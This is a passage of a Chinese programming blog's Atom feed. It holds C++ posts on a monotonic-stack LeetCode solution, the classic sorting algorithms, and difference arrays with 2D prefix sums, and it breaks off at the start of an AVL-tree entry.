class="type">int</span>&gt; st;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 后缀和</span></span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">suf</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 哨兵</span></span><br><span class="line">        st.<span class="built_in">push</span>(n);</span><br><span class="line">        <span class="comment">// 求后缀和</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="type">int</span> x = maxHeights[i];</span><br><span class="line">            <span class="comment">// x &lt;= maxHeights[st.top()] 等于代表相邻相同的数值存一次</span></span><br><span class="line">            <span class="keyword">while</span> (st.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; x &lt;= maxHeights[st.<span class="built_in">top</span>()]) &#123;</span><br><span class="line">                <span class="type">int</span> j = st.<span class="built_in">top</span>();</span><br><span class="line">                st.<span class="built_in">pop</span>();</span><br><span class="line">                sum -= (<span class="type">long</span> <span class="type">long</span>)maxHeights[j] * (st.<span class="built_in">top</span>() - j);</span><br><span class="line">            &#125;</span><br><span class="line">            sum += (<span class="type">long</span> <span class="type">long</span>)maxHeights[i] * (st.<span class="built_in">top</span>() - i);</span><br><span class="line">            suf[i] = sum;</span><br><span class="line">            st.<span class="built_in">push</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        st = <span class="built_in">stack</span>&lt;<span class="type">int</span>&gt;();</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = sum;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> pre = <span class="number">0</span>;</span><br><span class="line">        st.<span class="built_in">push</span>(<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> x = maxHeights[i];</span><br><span class="line">            <span class="keyword">while</span> (st.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; x &lt;= maxHeights[st.<span class="built_in">top</span>()]) &#123;</span><br><span class="line">                <span class="type">int</span> j = st.<span class="built_in">top</span>();</span><br><span class="line">                st.<span class="built_in">pop</span>();</span><br><span class="line">                pre -= (<span class="type">long</span> <span class="type">long</span>)maxHeights[j] * (j - st.<span class="built_in">top</span>());</span><br><span class="line">            &#125;</span><br><span class="line">            pre += (<span class="type">long</span> <span class="type">long</span>)maxHeights[i] * (i - st.<span class="built_in">top</span>());</span><br><span class="line">            ans = <span class="built_in">max</span>(ans, pre + suf[i + <span class="number">1</span>]);</span><br><span class="line">            st.<span class="built_in">push</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;单调栈&quot;&gt;&lt;a href=&quot;#单调栈&quot; class=&quot;headerlink&quot; title=&quot;单调栈&quot;&gt;&lt;/a&gt;单调栈&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://leetcode.cn/problems/trapping-rain-water/descript</summary>
      
    
    
    
    <category term="数据结构" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="skill" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/skill/"/>
    
    
    <category term="单调栈" scheme="https://1xueyu1.github.io/tags/%E5%8D%95%E8%B0%83%E6%A0%88/"/>
    
  </entry>
  
  <entry>
    <title>排序</title>
    <link href="https://1xueyu1.github.io/2023/12/20/%E6%8E%92%E5%BA%8F/"/>
    <id>https://1xueyu1.github.io/2023/12/20/%E6%8E%92%E5%BA%8F/</id>
    <published>2023-12-20T03:41:56.000Z</published>
    <updated>2023-12-23T12:54:58.193Z</updated>
    
    <content type="html"><![CDATA[<h1 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h1><h2 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h2><h3 id="插入排序-1"><a href="#插入排序-1" class="headerlink" title="插入排序"></a>插入排序</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 插入排序</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insertSort</span><span class="params">(<span class="type">int</span> nums[], <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> temp = nums[i];</span><br><span class="line"><span class="keyword">for</span> (j = i - <span class="number">1</span>; j &gt;= <span class="number">0</span> &amp;&amp; nums[j] &gt; temp; j--)</span><br><span class="line">&#123;</span><br><span class="line">nums[j + <span class="number">1</span>] = nums[j];</span><br><span class="line">&#125;</span><br><span class="line">nums[j + <span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="折半插入排序"><a href="#折半插入排序" class="headerlink" title="折半插入排序"></a>折半插入排序</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 折半插入</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">halfInsertSort</span><span class="params">(<span class="type">int</span> nums[], <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> temp = nums[i];</span><br><span class="line"><span class="comment">// 折半查找[0, i - 1]</span></span><br><span class="line">        <span class="comment">// 闭区间二分</span></span><br><span class="line"><span class="type">int</span> l = <span class="number">0</span>, r = i - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (l &lt;= r)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> m = l + (r - l) / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (nums[m] &lt; temp)</span><br><span class="line">&#123;</span><br><span class="line">l = m + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">r = m - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// [l, i - 1]元素后移</span></span><br><span class="line"><span class="keyword">for</span> (j = i - <span class="number">1</span>; j &gt;= l; j--)</span><br><span class="line">nums[j + <span class="number">1</span>] = nums[j];</span><br><span class="line"><span class="comment">// 插入指定位置</span></span><br><span class="line">nums[l] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 冒泡排序</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bubbleSort</span><span class="params">(<span class="type">int</span> nums[], <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 记录当前遍历是否发生过交换</span></span><br><span class="line"><span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="comment">// 每次将未排序的数中最小的数推到前面</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = n - <span class="number">1</span>; j &gt; i; j--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (nums[j] &lt; nums[j - <span class="number">1</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> t = nums[j];</span><br><span class="line">nums[j] = nums[j - <span class="number">1</span>];</span><br><span class="line">nums[j - <span class="number">1</span>] = t;</span><br><span class="line">flag = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果没有发生交换，说明已经有序了</span></span><br><span class="line"><span class="keyword">if</span> (flag == <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">quickSort</span><span class="params">(<span class="type">int</span> nums[], <span class="type">int</span> start, <span class="type">int</span> end)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (start &gt;= end)<span class="keyword">return</span>;</span><br><span class="line"><span class="comment">// 将第一个数作为基准值</span></span><br><span class="line"><span class="type">int</span> t = nums[start];</span><br><span class="line"><span class="type">int</span> i = start, j = end;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (i &lt; j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span> (i &lt; j &amp;&amp; nums[j] &gt;= t)</span><br><span class="line">&#123;</span><br><span class="line">j--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i &lt; j)</span><br><span class="line">nums[i] = nums[j];</span><br><span class="line"><span class="keyword">while</span> (i &lt; j &amp;&amp; nums[i] &lt;= t)</span><br><span class="line">&#123;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i &lt; j)</span><br><span class="line">nums[j] = nums[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 最后把基准值放在最后剩下的位置</span></span><br><span class="line">nums[i] = t;</span><br><span class="line"><span class="comment">// 并分为两部分</span></span><br><span class="line"><span class="comment">// i 左边的都更小，右边的都更大</span></span><br><span class="line"><span class="built_in">quickSort</span>(nums, start, i - <span class="number">1</span>);</span><br><span class="line"><span class="built_in">quickSort</span>(nums, i + <span class="number">1</span>, end);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 选择排序</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">selectSort</span><span class="params">(<span class="type">int</span> nums[], <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; n; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (nums[i] &gt; nums[j])</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> t = nums[i];</span><br><span class="line">nums[i] = nums[j];</span><br><span class="line">nums[j] = t;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mergeSort</span><span class="params">(<span class="type">int</span> nums[], <span class="type">int</span> left, <span class="type">int</span> right)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (left &gt;= right)<span class="keyword">return</span>;</span><br><span class="line"><span class="type">int</span> mid = left + (right - left) / <span class="number">2</span>;</span><br><span class="line"><span class="comment">// 递归拆分</span></span><br><span class="line"><span class="built_in">mergeSort</span>(nums, left, mid);</span><br><span class="line"><span class="built_in">mergeSort</span>(nums, mid + <span class="number">1</span>, right);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 合并</span></span><br><span class="line"><span class="type">int</span> i, j, k;</span><br><span class="line"><span class="comment">// 先将数组元素放到辅助数组中去</span></span><br><span class="line"><span class="keyword">for</span> (k = left; k &lt;= right; k++)</span><br><span class="line">&#123;</span><br><span class="line">a[k] = nums[k];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = left, j = mid + <span class="number">1</span>, k = i; i &lt;= mid &amp;&amp; j &lt;= right; k++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 如果左边的小就放左边的</span></span><br><span class="line"><span class="keyword">if</span> (a[i] &lt;= a[j])</span><br><span class="line">&#123;</span><br><span class="line">nums[k] = a[i++];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 否则放右边的</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">nums[k] = a[j++];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 当有一个完成了就跳出，把另一个序列的剩下所有元素放进去</span></span><br><span class="line"><span class="keyword">while</span> (i &lt;= mid)nums[k++] = a[i++];</span><br><span class="line"><span class="keyword">while</span> (j &lt;= right)nums[k++] = a[j++];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 堆调整</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">heapUpdate</span><span class="params">(<span class="type">int</span> nums[], <span class="type">int</span> start, <span class="type">int</span> end)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> dad = start;</span><br><span class="line"><span class="type">int</span> son = dad * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (son &lt;= end)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (son + <span class="number">1</span> &lt;= end &amp;&amp; nums[son] &lt; nums[son + <span class="number">1</span>])son++;</span><br><span class="line"><span class="keyword">if</span> (nums[dad] &gt; nums[son])<span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">swap</span>(&amp;nums[dad], &amp;nums[son]);</span><br><span class="line">dad = son;</span><br><span class="line">son = dad * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 堆排序</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">heapSort</span><span class="params">(<span class="type">int</span> nums[], <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = n / <span class="number">2</span> - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 更新以i为根的子树</span></span><br><span class="line"><span class="built_in">heapUpdate</span>(nums, i, n - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">swap</span>(&amp;nums[<span class="number">0</span>], &amp;nums[i]);</span><br><span class="line"><span class="built_in">heapUpdate</span>(nums, <span class="number">0</span>, i - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;排序算法&quot;&gt;&lt;a href=&quot;#排序算法&quot; class=&quot;headerlink&quot; title=&quot;排序算法&quot;&gt;&lt;/a&gt;排序算法&lt;/h1&gt;&lt;h2 id=&quot;插入排序&quot;&gt;&lt;a href=&quot;#插入排序&quot; class=&quot;headerlink&quot; title=&quot;插入排序&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="数据结构" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="排序" scheme="https://1xueyu1.github.io/tags/%E6%8E%92%E5%BA%8F/"/>
    
  </entry>
  
  <entry>
    <title>差分数组</title>
    <link href="https://1xueyu1.github.io/2023/12/17/%E5%B7%AE%E5%88%86%E6%95%B0%E7%BB%84/"/>
    <id>https://1xueyu1.github.io/2023/12/17/%E5%B7%AE%E5%88%86%E6%95%B0%E7%BB%84/</id>
    <published>2023-12-17T11:33:22.000Z</published>
    <updated>2023-12-25T16:12:25.116Z</updated>
    
    <content type="html"><![CDATA[<h1 id="差分数组"><a href="#差分数组" class="headerlink" title="差分数组"></a>差分数组</h1><h2 id="一维差分数组"><a href="#一维差分数组" class="headerlink" title="一维差分数组"></a>一维差分数组</h2><p><a href="https://leetcode.cn/problems/car-pooling/solutions/2550264/suan-fa-xiao-ke-tang-chai-fen-shu-zu-fu-9d4ra/">1094. 拼车 - 力扣（LeetCode）</a></p><h3 id="定义和性质"><a href="#定义和性质" class="headerlink" title="定义和性质"></a>定义和性质</h3><p><img src="/2023/12/17/%E5%B7%AE%E5%88%86%E6%95%B0%E7%BB%84/image-20231217193954494.png" alt="image-20231217193954494"></p><h2 id="二维前缀和"><a href="#二维前缀和" class="headerlink" title="二维前缀和"></a>二维前缀和</h2><p><a href="https://leetcode.cn/problems/stamping-the-grid/solutions/1199642/wu-nao-zuo-fa-er-wei-qian-zhui-he-er-wei-zwiu/?envType=daily-question&envId=2023-12-14">2132. 用邮票贴满网格图 - 力扣（LeetCode）</a></p><p><a href="https://leetcode.cn/circle/discuss/UUuRex/">【图解】二维前缀和（附模板代码 Python&#x2F;Java&#x2F;C++&#x2F;Go&#x2F;JS） - 力扣（LeetCode）</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">possibleToStamp</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid, <span class="type">int</span> stampHeight, <span class="type">int</span> stampWidth)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = grid.<span class="built_in">size</span>(), n = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.二维前缀和数组</span></span><br><span class="line">        <span class="comment">// s[i][j] 代表前 i 行每行的前 j 个元素的和</span></span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">s</span>(m + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; (n + <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 可以先想一下，或者可以看上面的链接</span></span><br><span class="line">                s[i][j] = s[i][j - <span class="number">1</span>] + s[i - <span class="number">1</span>][j] - s[i - <span class="number">1</span>][j - <span class="number">1</span>] + grid[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 用一个二维数组记录满足的情况， 如果这一块满足情况，就将里面的元素全部加1</span></span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">d</span>(m + <span class="number">2</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; (n + <span class="number">2</span>));</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i2 = stampHeight; i2 &lt;= m; i2++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j2 = stampWidth; j2 &lt;= n; j2++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> i1 = i2 - stampHeight + <span class="number">1</span>;</span><br><span class="line">                <span class="type">int</span> j1 = j2 - stampWidth + <span class="number">1</span>;</span><br><span class="line">                <span class="comment">// 如果这一片的面积为0说明是满足情况的</span></span><br><span class="line">                <span class="keyword">if</span>(s[i2][j2] - s[i2][j1 - <span class="number">1</span>] - s[i1 - <span class="number">1</span>][j2] + s[i1 - <span class="number">1</span>][j1 - <span class="number">1</span>] == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    d[i1][j1]++;</span><br><span class="line">                    d[i1][j2 + <span class="number">1</span>]--;</span><br><span class="line">                    d[i2 + <span class="number">1</span>][j1]--;</span><br><span class="line">                    d[i2 + <span class="number">1</span>][j2 + <span class="number">1</span>]++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.还原二维差分数组</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                d[i + <span class="number">1</span>][j + <span class="number">1</span>] += d[i + <span class="number">1</span>][j] + d[i][j + <span class="number">1</span>] - d[i][j];</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(grid[i][j] == <span class="number">0</span> &amp;&amp; d[i + <span class="number">1</span>][j + <span class="number">1</span>] == <span class="number">0</span>)<span class="comment">// 这说明这个格子没有情况是满足的</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;差分数组&quot;&gt;&lt;a href=&quot;#差分数组&quot; class=&quot;headerlink&quot; title=&quot;差分数组&quot;&gt;&lt;/a&gt;差分数组&lt;/h1&gt;&lt;h2 id=&quot;一维差分数组&quot;&gt;&lt;a href=&quot;#一维差分数组&quot; class=&quot;headerlink&quot; title=&quot;一维差分数</summary>
      
    
    
    
    <category term="数据结构" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="skill" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/skill/"/>
    
    
    <category term="差分数组" scheme="https://1xueyu1.github.io/tags/%E5%B7%AE%E5%88%86%E6%95%B0%E7%BB%84/"/>
    
  </entry>
  
  <entry>
    <title>AVL树</title>
    <link href="https://1xueyu1.github.io/2023/12/12/AVL%E6%A0%91/"/>
    <id>https://1xueyu1.github.io/2023/12/12/AVL%E6%A0%91/</id>
    <published>2023-12-12T11:54:33.000Z</published>
    <updated>2023-12-12T12:41:09.502Z</updated>
    
